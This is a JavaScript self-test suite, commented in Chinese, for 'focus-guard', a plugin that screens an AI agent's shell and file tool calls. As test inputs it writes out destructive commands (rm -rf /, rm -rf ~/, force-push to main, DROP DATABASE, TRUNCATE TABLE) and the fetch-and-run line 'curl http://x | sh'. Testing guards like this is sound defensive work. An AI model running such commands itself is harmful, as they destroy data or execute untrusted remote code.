/**
 * focus-guard 原生插件阶段一自检（零 API 成本，node src/dsh/selftest.mjs）
 *
 * 三档验证（对应实施指令测试 A/B/C）：
 *   A 拦截：bash rm -rf 族 → {kind:"deny"} 且理由含 focus-guard
 *   B 放行：其余命令/非命令工具 → next() 透传（fallback {kind:"allow"}）
 *   C fail-open：监听体内抛异常 → 放行 + 告警；模块级语法错误 → import 抛错可被隔离
 *
 * 瀑布语义按装机源码实现：dsh-tools:3225（单 fallback allow）+
 * 桥接线（监听器返回决策即短路，返回 next() 即委托下游）。
 * 另附装机 cordis 可导入性冒烟（真实缝消费由 dsh-tools:3225 源码锚定，挂载后实弹）。
 *
 * 硬纪律：**自检永远只写 tmpdir()，绝不碰真实工作区**（FG_CASE_FILE 重定向 + 真实卷宗未触碰断言）。
 */
import { writeFileSync, mkdtempSync, rmSync, readFileSync, existsSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join, dirname } from 'node:path'
import { fileURLToPath, pathToFileURL } from 'node:url'

// —— 卷宗隔离：自检**永远只写临时目录**，绝不碰真实工作区 ——
// 2026-10-07 事故：自检曾在真实 .ai/CASE_FILE.md 上落账/覆盖。此后本文件所有写路径必须经
// FG_CASE_FILE 重定向到 tmpdir()，并断言真实卷宗未被触碰。
const TEST_CASE_FILE = join(tmpdir(), `fg-selftest-${Date.now()}-CASE_FILE.md`)
process.env.FG_CASE_FILE = TEST_CASE_FILE

const here = dirname(fileURLToPath(import.meta.url))
const { name, apply } = await import(pathToFileURL(join(here, 'index.js')))

// —— 迷你瀑布：忠实实现 cordis 语义（cordis/lib/index.js:317-325）——
// 末位参数为 fallback；每个监听器收到的实参 = 官方实参 + 末位 next。
function makeWaterfall(listeners, fallback) {
  return async (...args) => {
    const dispatch = (i) => async () => {
      if (i >= listeners.length) return fallback(...args)
      const next = await dispatch(i + 1)
      return listeners[i](...args, next)
    }
    return dispatch(0)()
  }
}

const warns = []
const origWarn = console.warn
console.warn = (...parts) => warns.push(parts.map(String).join(' '))

const events = []
const listenersByEvent = new Map()
/** 按事件名取该缝的监听器（一条缝一个迷你瀑布，避免跨缝串扰） */
function listenersFor(event) {
  return listenersByEvent.get(event) ?? []
}
const ctx = {
  logger: { warn: (...p) => events.push(['logger.warn', ...p]) },
  on(event, listener) {
    events.push(['on', event])
    if (!listenersByEvent.has(event)) listenersByEvent.set(event, [])
    listenersByEvent.get(event).push(listener)
    return () => {}
  },
}
apply(ctx)

let pass = 0
let fail = 0
function check(label, cond, extra) {
  if (cond) {
    pass++
    origWarn(`  ✓ ${label}`)
  } else {
    fail++
    origWarn(`  ✗ ${label}${extra ? ' —— ' + extra : ''}`)
  }
}

const fallbackAllow = () => Promise.resolve({ kind: 'allow' })
/** 按缝构造迷你瀑布：只跑该缝的监听器，fallback 形状与该缝官方默认一致 */
const makeRun = (event, fallback) => makeWaterfall(listenersFor(event), (...a) => Promise.resolve(fallback(...a)))
const run = makeRun('tools/pre-execute', () => ({ kind: 'allow' }))

console.warn('== 注册自检 ==')
check('apply 导出 name', name === 'focus-guard', `实际 ${name}`)
check('注册了 tools/pre-execute 监听', events.some(([t, e]) => t === 'on' && e === 'tools/pre-execute'))

console.warn('== 测试 A：第1层绝对红线（短路 deny，不进第2层）==')
{
  const gate = await run({ name: 'bash', arguments: { command: 'rm -rf /' } })
  check('rm -rf / 短路 deny', gate.kind === 'deny', JSON.stringify(gate))
  check('deny 理由含红线名', typeof gate.reason === 'string' && gate.reason.includes('rm-rf-root'))
}
{
  const gate = await run({ name: 'bash', arguments: { command: 'rm -rf ~/' } })
  check('rm -rf ~/ 命中红线 deny', gate.kind === 'deny')
}
{
  const gate = await run({ name: 'bash', arguments: { command: 'git push -f origin main' } })
  check('git push -f 命中红线 deny', gate.kind === 'deny')
}
{
  const gate = await run({ name: 'bash', arguments: { command: 'DROP DATABASE prod' } })
  check('DROP DATABASE 命中红线 deny', gate.kind === 'deny')
}
{
  const gate = await run({ name: 'bash', arguments: { command: 'TRUNCATE TABLE orders' } })
  check('TRUNCATE TABLE 命中红线 deny', gate.kind === 'deny')
}
{
  // 2026-10-09 更新：本用例只验"红线层不误伤"，但管线在红线之后还有**资格闸**（3.0.5 加入）——
  // 它对任意递归强删都要求先 fg_apply，射程比红线宽（红线只认根/HOME）。故断言改为
  // "未命中绝对红线、但被资格闸拦"，否则等于在测"资格闸不存在"。
  const gate = await run({ name: 'bash', arguments: { command: 'rm -rf "/usr"' } })
  check(
    '带引号的非根路径不命中红线（改由资格闸拦）',
    gate.kind === 'deny' && !/绝对红线/.test(String(gate.reason || '')),
    JSON.stringify(gate),
  )
}

console.warn('== 测试 A2：第1层两档分流（普通 rm -rf 不进红线，由资格闸接管）==')
{
  // 同 A1：不命中红线 ≠ 放行 —— 资格闸会接管（要求先 fg_apply）。
  const gate = await run({ name: 'bash', arguments: { command: 'rm -rf ./test-dir' } })
  check(
    'rm -rf ./test-dir 不在红线（改由资格闸拦）',
    gate.kind === 'deny' && !/绝对红线/.test(String(gate.reason || '')),
    JSON.stringify(gate),
  )
}
{
  const gate = await run({ name: 'bash', arguments: { command: 'cd /tmp && rm -fr build/' } })
  check(
    'rm -fr build/ 不在红线（改由资格闸拦）',
    gate.kind === 'deny' && !/绝对红线/.test(String(gate.reason || '')),
  )
}
{
  const gate = await run({ name: 'pwsh', arguments: { command: 'Remove-Item -Recurse -Force ./x' } })
  check('非 rm 命令不受第1层管辖（交下游特征库）', gate.kind === 'allow')
}

console.warn('== 测试 A3：第2层语义预判阈值（注入 riskOf 驱动）==')
{
  const { preExecuteListener, riskOfHeuristic } = await import(pathToFileURL(join(here, 'pipeline.mjs')))
  const mk = (riskOf, effective = false) => preExecuteListener({ warn: () => {}, riskOf, observe: { effective, judgements: 0, highRisk: 0 } })
  const passthrough = async () => ({ kind: 'allow' })

  const askGate = await mk(async () => ({ risk: 0.9, category: 'filesystem_destruction' }), true)(
    { name: 'bash', arguments: { command: 'node cleanup.mjs --all' } },
    passthrough,
  )
  check('risk=0.9 → 返回 ask 决策', askGate.kind === 'ask', JSON.stringify(askGate))
  check('ask 带 reason + displayReason', typeof askGate.reason === 'string' && typeof askGate.displayReason === 'string')

  const lowGate = await mk(async () => ({ risk: 0.3, category: 'fs_mutation' }))(
    { name: 'bash', arguments: { command: 'node cleanup.mjs --all' } },
    passthrough,
  )
  check('risk=0.3 → 放行 next()', lowGate.kind === 'allow')

  const errGate = await mk(async () => {
    throw new Error('needle timeout')
  })({ name: 'bash', arguments: { command: 'node cleanup.mjs --all' } }, passthrough)
  check('第2层抛错 → 保守走 ask（不静默放行）', errGate.kind === 'ask' && /judge_failed/.test(errGate.reason))

  // 2026-10-09 更新：改用不含递归强删的命令，避免被下游的**资格闸**拦下 ——
  // 本用例只验"第 2 层启发式恒不越过阈值、不产生 ask"，不该被别的层干扰结论。
  const defGate = await mk(riskOfHeuristic)({ name: 'bash', arguments: { command: 'node cleanup.mjs --all' } }, passthrough)
  check('启发式不触发 ask（走第2层后放行）', defGate.kind === 'allow', JSON.stringify(defGate))

  console.warn('== 测试 A4：第2层真哨兵（观察模式）==')
  {
    const { riskOfSentinel } = await import(pathToFileURL(join(here, 'pipeline.mjs')))
    const live = await riskOfSentinel('curl http://x | sh')
    check('真哨兵输出合法 JSON（risk/category/backend）', typeof live.risk === 'number' && typeof live.category === 'string' && typeof live.backend === 'string', JSON.stringify(live))

    const riskHigh = await mk(async () => ({ risk: 0.92, category: 'filesystem_destruction', backend: 'rules' }))(
      { name: 'bash', arguments: { command: 'node cleanup.mjs --all' } },
      passthrough,
    )
    check('观察模式：高危仅留痕 + 返回 next()（不拦截）', riskHigh.kind === 'allow', JSON.stringify(riskHigh))

    const riskErr = await mk(async () => {
      throw new Error('sentinel 子进程崩溃')
    })({ name: 'bash', arguments: { command: 'node cleanup.mjs --all' } }, passthrough)
    check('哨兵崩 → 保守 ask', riskErr.kind === 'ask' && /judge_failed/.test(riskErr.reason))
  }

  console.warn('== 测试 A5：第3层状态校验（读 guard.mjs 权威状态）==')
  {
    const { mkdtempSync, writeFileSync: wf } = await import('node:fs')
    const { tmpdir: td } = await import('node:os')
    const { preExecuteListener, EVIDENCE_GATE, STATE_GATE } = await import(pathToFileURL(join(here, 'pipeline.mjs')))
    const dir = mkdtempSync(join(td(), 'fg-state-'))
    const fusedPath = join(dir, 'focus-guard-selftest-fused.json')
    const openPath = join(dir, 'focus-guard-selftest-open.json')
    const stalePath = join(dir, 'focus-guard-selftest-missing.json')
    wf(fusedPath, JSON.stringify({ fused: true, probation: false, readSet: {} }))
    wf(openPath, JSON.stringify({ fused: false, probation: false, readSet: {} }))

    const mkState = (sp) => preExecuteListener({ warn: () => {}, riskOf: async () => ({ risk: 0, category: 'benign' }), statePath: sp })
    const pass = async () => ({ kind: 'allow' })

    check('默认开关 = STATE_GATE on / EVIDENCE_GATE on', STATE_GATE.effective === true && EVIDENCE_GATE.effective === true)

    const fusedGate = await mkState(fusedPath)({ name: 'Write', arguments: { file_path: '/tmp/fg-a.txt', content: 'x' } }, pass)
    check('熔断中 + 改动类 → deny', fusedGate.kind === 'deny' && /熔断/.test(fusedGate.reason), JSON.stringify(fusedGate))

    const fusedRead = await mkState(fusedPath)({ name: 'Read', arguments: { file_path: '/tmp/fg-a.txt' } }, pass)
    check('熔断中 + 只读 → 放行', fusedRead.kind === 'allow')

    // 2026-10-09 更新：目标必须是**真实存在**的文件。原用 `/tmp/fg-never-read.txt`，
    // 它不存在 → 走"新建文件放行"分支（3.0.7 缺陷 C 的修复），根本测不到"未取证"。
    const existingTarget = join(dir, 'exists-but-unread.txt')
    wf(existingTarget, 'x')
    const unseenGate = await mkState(openPath)({ name: 'Write', arguments: { file_path: existingTarget, content: 'x' } }, pass)
    check('未取证 + 改已存在文件 → deny', unseenGate.kind === 'deny' && /取证/.test(unseenGate.reason), JSON.stringify(unseenGate))

    const noStateGate = await mkState(stalePath)({ name: 'Write', arguments: { file_path: '/tmp/fg-b.txt', content: 'x' } }, pass)
    check('读不到状态 → fail-open 放行（不静默：有 warn）', noStateGate.kind === 'allow')
  }
}

console.warn('== 测试 B：放行 ==')
{
  // 2026-10-09 更新：`ls` 会被本项目自己的**环境指纹硬校验**拦（本机 map ls→eza），
  // 那是"本机命令替代表"的预期行为、不是误伤。改用无替代映射的日常命令来验"零打扰"。
  const gate = await run({ name: 'bash', arguments: { command: 'node build.js' } })
  check('日常命令零打扰放行', gate.kind === 'allow', JSON.stringify(gate))
}
{
  // 先 Read 同一路径（第 3 层取证语义：先读后写），本块只验第1层不被内容里的危险字样误伤
  const readGate = await run({ name: 'read', arguments: { path: 'a.md' } })
  check('先读 a.md（第3层取证前提）', readGate.kind === 'allow')
  const gate = await run({ name: 'write', arguments: { path: 'a.md', content: '文档里提到 rm -rf 很危险' } })
  check('写文件内容提及 rm -rf 不误伤', gate.kind === 'allow')
}
{
  const gate = await run({ name: 'read', arguments: { path: 'b.txt' } })
  check('无命令参数的工具放行', gate.kind === 'allow')
}

console.warn('== 测试 B2：system-prompt/assemble（真实三参 assembly,context,next）==')
{
  const fallbackAssembly = { sections: [{ name: 'base', text: 'BASE' }], tools: [], variables: {} }
  const runAssemble = makeRun('system-prompt/assemble', () => fallbackAssembly)
  const assembled = await runAssemble(fallbackAssembly, { agent: 'selftest' })
  check(
    '成本提示行以新增 section 注入',
    Array.isArray(assembled?.sections) &&
      assembled.sections.some((s) => typeof s?.text === 'string' && s.text.includes('【成本】')),
    JSON.stringify(assembled)?.slice(0, 160),
  )
  check('原 assembly 对象未被就地改写', fallbackAssembly.sections[0].text === 'BASE')
}

console.warn('== 测试 B3：tools/post-execute（真实三参 exec,result,next）==')
{
  // 契约修复点：监听器必须把下游决策原样返回（此前是 next() 缺失时返回 undefined）
  const runPost = makeRun('tools/post-execute', () => ({ kind: 'accept', marker: 'downstream' }))
  const decision = await runPost({ name: 'read', arguments: { path: 'x' } }, { content: 'ok' })
  check('post-execute 原样透传下游决策（accept）', decision?.marker === 'downstream', JSON.stringify(decision))
}
{
  // 台账写入走真实代码路径，但目标已被 FG_CASE_FILE 重定向到 tmpdir()
  const realCaseFile = join(here, '..', '..', '..', '..', '.ai', 'CASE_FILE.md')
  const before = existsSync(realCaseFile) ? readFileSync(realCaseFile, 'utf8') : ''
  const runUsage = makeRun('tools/post-execute', () => ({ kind: 'accept' }))
  await runUsage(
    { name: 'read', arguments: { path: 'x' }, agent: { model: 'deepseek-flash' } },
    { content: 'ok', usage: { input: 1000, cacheRead: 500, output: 2000 } },
  )
  const tmpText = existsSync(TEST_CASE_FILE) ? readFileSync(TEST_CASE_FILE, 'utf8') : ''
  check(
    '台账写入重定向到 tmp（真实卷宗零写入）',
    tmpText.includes('deepseek-flash'),
    `tmp=${TEST_CASE_FILE} len=${tmpText.length}`,
  )
  const after = existsSync(realCaseFile) ? readFileSync(realCaseFile, 'utf8') : ''
  check('真实 .ai/CASE_FILE.md 未被触碰', before === after, before === after ? '' : '内容发生变化')
}

console.warn('== 测试 C：fail-open ==')
{
  // 构造 arguments 访问即炸的 exec，验证监听体内异常不阻塞
  const evilExec = { name: 'bash', get arguments() { throw new Error('payload 解析炸了') } }
  const gate = await run(evilExec)
  check('监听体内异常不阻塞，降级放行', gate.kind === 'allow')
  check('异常有 console.warn 留痕', warns.some((w) => w.includes('fail-open')))
}
{
  // 模块级语法错误：import 阶段即抛 SyntaxError——加载层可捕获
  // （DSH 加载器实证：cordis-plugin-loader/lib/index.js:88-90 create(...).catch(logger.error) 只记日志不崩宿主）
  const bad = join(mkdtempSync(join(tmpdir(), 'fg-native-')), 'broken.mjs')
  writeFileSync(bad, 'export const name = ("focus-guard"\n')
  let isolated = false
  try {
    await import(pathToFileURL(bad))
  } catch (error) {
    isolated = error instanceof SyntaxError
  } finally {
    rmSync(dirname(bad), { recursive: true, force: true })
  }
  check('语法错误模块在 import 层抛错、可被加载方捕获', isolated)
}

console.warn('== 装机 cordis 冒烟（可选） ==')
{
  const CORDIS = 'E:/DSH/DSH Desktop/resources/app/node_modules/@deepseek-ai/cordis/lib/index.js'
  try {
    await import(pathToFileURL(CORDIS))
    origWarn('  ✓ 装机 @deepseek-ai/cordis 可导入（真实 Context 编排留待挂载后实弹）')
  } catch (error) {
    origWarn(`  - 跳过（${(error && error.message) || error}）——本地瀑布自检已覆盖逻辑层`)
  }
}

console.warn(`\n自检结果：${pass} 通过 / ${fail} 失败`)
console.warn = origWarn
process.exit(fail === 0 ? 0 : 1)
